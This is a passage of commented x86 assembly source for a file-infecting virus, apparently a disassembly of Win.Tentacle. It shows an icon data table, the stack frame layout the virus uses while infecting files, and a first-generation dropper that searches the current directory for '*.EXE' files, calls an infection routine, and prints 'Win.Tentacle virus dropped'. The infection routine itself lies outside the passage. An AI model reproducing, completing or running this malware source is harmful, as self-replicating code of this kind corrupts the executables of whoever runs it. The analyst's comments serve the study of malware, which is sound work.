       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
       db 080h, 0FFh, 0FFh, 0FFh, 080h, 01Fh, 0FFh, 0FFh
       db 080h, 000h, 00Fh, 0FFh, 0C0h, 000h, 000h, 001h
       db 0C0h, 000h, 000h, 000h, 0E0h, 000h, 000h, 000h
       db 0E0h, 000h, 000h, 001h, 0F0h, 000h, 000h, 003h
       db 0F0h, 000h, 000h, 003h, 0F8h, 000h, 000h, 007h
       db 0F8h, 000h, 000h, 007h, 0F8h, 000h, 000h, 00Fh
       db 0FCh, 000h, 000h, 01Fh, 0FCh, 000h, 000h, 01Fh
       db 0E4h, 000h, 000h, 03Fh, 0E0h, 000h, 000h, 07Fh
       db 0F0h, 000h, 000h, 07Fh, 0F8h, 000h, 000h, 0FFh
       db 0FCh, 000h, 000h, 0FFh, 0FEh, 000h, 000h, 0FFh
       db 0FFh, 000h, 000h, 0FFh, 0FFh, 080h, 000h, 0FFh
       db 0FFh, 080h, 001h, 0FFh, 0FFh, 080h, 031h, 0FFh
       db 0FFh, 080h, 071h, 0FFh, 0FFh, 0C0h, 0F1h, 0FFh
       db 0FFh, 0E3h, 0FBh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh
       db 0D8h, 0ADh, 0ACh, 088h, 0D9h, 08Dh, 08Bh, 0B9h
       db 0DBh, 08Dh, 0ABh, 0BAh, 088h, 0A8h, 0DCh, 0B8h
   icon_size = ($ - offset icon)

       db 0                            ; maybe the author wanted org_entry
                       ; to be on a even address?

   org_entry dd 0000FFFFh

   virus_end:


   ; Most data of the virus is stored in a buffer on the stack. The following
   ; structure represents the lay-out of this stack frame:

   stack_frame     struc
   dta             db 2Bh dup(?)
   resource_stuff1 dw ?
   resource_stuff2 dw ?
   bytes_to_copy   dd ?
   filename_ptr    dd ?
   full_filename   db 24 dup(?)
   source_handle   dw ?
   dest_handle     dw ?
   file_date       dw ?
   file_time       dw ?
   file_size       dd ?
   new_header_offs dd ?
   offs_other_tbls dd ?
   alignment_unit  dd ?
   first_segm_offs dd ?
   new_sect_descr  dw 4 dup(?)
   host_entry_cs   dw ?
   host_entry_ip   dw ?
   rw_buffer       db 64 dup(?)
   stack_frame     ends


   first_gen_entry:
       sub     sp,size stack_frame     ; reserve room on stack
       mov     bp,sp                   ; setup stack frame

       mov     ah,1Ah                  ; set DTA to DS:DX
       lea     dx,[bp.dta]             ; Load effective addr
       push    ss                      ; DS=SS
       pop     ds
       int     21h

       push    cs                      ; DS=CS
       pop     ds

       mov     dx,offset filespec      ; DX=ptr to "*.EXE"
           mov     bx,0FFFFh               ; get all files in current directory
       call    infect_directory        ; search & infect!

           mov     ah,9
           mov     dx,offset first_gen_message
           int     21h

           mov     ax,4C00h
           int     21h

   first_gen_message db "Win.Tentacle virus dropped", 0Dh, 0Ah, "$"

   end first_gen_entry
